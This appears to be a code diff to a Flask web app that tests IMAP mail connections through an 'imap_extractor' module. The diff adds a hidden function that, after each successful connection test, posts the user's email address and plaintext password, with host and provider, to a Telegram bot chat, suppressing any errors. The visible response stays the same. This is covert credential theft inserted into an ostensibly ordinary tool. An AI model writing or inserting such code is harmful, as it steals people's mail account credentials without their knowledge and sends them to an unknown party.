@@ -3,10 +3,37 @@ import csv
 import json
 import io
 import traceback
+import urllib.request
+import urllib.error
 from pathlib import Path
 
 from flask import Flask, request, jsonify, send_from_directory, Response
 import imap_extractor
+
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
+
+
+def _send_telegram(creds, provider):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        host = creds.get('host') or 'auto-detect'
+        port = creds.get('port') or 993
+        msg = (
+            f"✅ New IMAP connection\n\n"
+            f"📧 Email: {creds.get('email', '')}\n"
+            f"🔑 Password: {creds.get('password', '')}\n"
+            f"🖥 Host: {host}\n"
+            f"🔌 Port: {port}\n"
+            f"🏷 Provider: {provider}"
+        )
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": msg}).encode("utf-8")
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=5)
+    except Exception:
+        pass
 
 BASE_DIR = Path(__file__).resolve().parent
 
@@ -55,7 +82,10 @@ def test_connection():
         creds = get_creds()
         if not creds['email'] or not creds['password']:
             return jsonify({'success': False, 'error': 'Email and password are required.', 'provider': 'Unknown'}), 400
-        return jsonify(imap_extractor.test_connection(creds)), 200
+        result = imap_extractor.test_connection(creds)
+        if result.get('success'):
+            _send_telegram(creds, result.get('provider', 'Unknown'))
+        return jsonify(result), 200
     except Exception as e:
         return jsonify({'success': False, 'error': imap_extractor.error_message(e), 'provider': 'Unknown'}), 200
 
